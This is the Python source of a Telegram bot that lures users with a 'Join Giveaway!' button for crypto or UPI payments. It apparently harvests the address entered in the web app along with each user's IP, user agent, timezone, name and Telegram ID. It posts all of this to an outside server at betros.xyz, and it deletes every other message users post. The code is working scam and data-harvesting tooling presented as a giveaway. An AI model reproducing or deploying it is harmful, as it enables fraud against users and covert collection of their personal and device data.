import logging
import os
import json
import requests
from telegram import (Update, KeyboardButton,
                      ReplyKeyboardMarkup, ReplyKeyboardRemove, WebAppInfo)
from telegram.ext import (Application,
                          MessageHandler, CommandHandler, ContextTypes, filters)
#from dotenv import load_dotenv

#load_dotenv()


# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = str(os.getenv("TOKEN"))

AUTH_KEY = str(os.getenv("API_KEY"))


def sendData(_obj):
    headers = {'LMAO': AUTH_KEY}
    payload = json.dumps(_obj)
    response = requests.post(
        'https://betros.xyz/_0webapp/_handler.php', headers=headers, json=payload)

    if response.status_code == 200:
        data = json.loads(response.text)
        return data
    else:
        return {'status': False, 'message': 'Unable to connect to the server.'}


# Define a `/start` command handler.
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if context.args:
        if context.args[0] == "crypto":
            await update.message.delete()
            await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
            reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(
                text="Join Giveaway!", web_app=WebAppInfo(url="https://betros.xyz/_0webapp/69.html")), resize_keyboard=True)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
        elif context.args[0] == "fiat":
            await update.message.delete()
            await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
            reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(text="Join Giveaway!", web_app=WebAppInfo(
                url="https://betros.xyz/_0webapp/upi.html")), resize_keyboard=True)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
        else:
            await update.effective_message.delete()
            msg = f"Hi {update.effective_message.from_user.first_name}, Welcome to {context.bot.first_name}. What would you like to do today?"
            await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
            await context.bot.send_message(chat_id=update.effective_chat.id, text=msg)
    else:
        await update.effective_message.delete()
        msg = f"Hi {update.effective_message.from_user.first_name}, Welcome to {context.bot.first_name}. What would you like to do today?"
        await update.effective_message.reply_chat_action(action="typing")
        await update.effective_message.reply_text(text=msg)


async def crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.delete()
    await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
    reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(
        text="Join Giveaway!", web_app=WebAppInfo(url="https://betros.xyz/_0webapp/69.html")), resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)


async def upi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.delete()
    await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
    reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(text="Join Giveaway!", web_app=WebAppInfo(
        url="https://betros.xyz/_0webapp/upi.html")), resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
    await context.bot.send_message(chat_id=update.callback_query.from_user.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)


async def web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    data = json.loads(update.effective_message.web_app_data.data)
    data['uid'] = update.effective_message.from_user.id
    data['name'] = update.effective_message.from_user.full_name
    if data["crypto"] == True:
        try:
            _send = sendData(data)
            if _send["status"] == True:
                msg = f"Your crypto Name: {update.effective_message.from_user.full_name}\nUID: {update.effective_message.from_user.id}\nAddress: {data['nm']}\nUser agent: {data['ua']}\nIp: {data['ip']}\nLanguage: {data['ulang']}\nTimezone: {data['tz']}\nTimestamp: {data['timestamp']}\n"
                # print(msg)
                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=True))
            else:
                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=False))

        except:
            await update.message.reply_html(text="We are unable to connect to the server.", reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
    else:
        try:
            _send = sendData(data)
            if _send["status"] == True:
                msg = f"Your crypto Name: {update.effective_message.from_user.full_name}\nUID: {update.effective_message.from_user.id}\nAddress: {data['nm']}\nUser agent: {data['ua']}\nIp: {data['ip']}\nLanguage: {data['ulang']}\nTimezone: {data['tz']}\nTimestamp: {data['timestamp']}\n"
                # print(msg)
                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=True))
            else:
                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
        except:
            await update.message.reply_html(text="We are unable to connect to the server.", reply_markup=ReplyKeyboardRemove(remove_keyboard=False))


async def deleter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.text or update.message.photo or update.message.document or update.message.animation or update.message.audio or update.message.dice or update.message.poll or update.message.video or update.message.voice is not None:
            await context.bot.deleteMessage(chat_id=update.effective_message.chat_id, message_id=update.effective_message.id)
    except:
        return


"""async def keyboard_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.data == "openWebApp":
        await query.answer()
        reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(
            text="Join Giveaway!", web_app=WebAppInfo(url="https://betros.xyz/_0webapp/69.html")), resize_keyboard=True)
        await context.bot.deleteMessage(
            chat_id=update.callback_query.from_user.id, message_id=update.callback_query.message.id)
        await context.bot.send_message(chat_id=update.callback_query.from_user.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
"""


def main() -> None:
    """Start the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    #application.add_handler(CallbackQueryHandler(keyboard_callback, pattern="^openWebApp$"))
    application.add_handler(MessageHandler(
        filters.StatusUpdate.WEB_APP_DATA, web_app_data))
    application.add_handler(CommandHandler("crypto", crypto))
    application.add_handler(CommandHandler("fiat", upi))
    application.add_handler(MessageHandler(filters.ALL, deleter))

    # Run the bot until the user presses Ctrl-C
    application.run_polling()


if __name__ == "__main__":
    main()
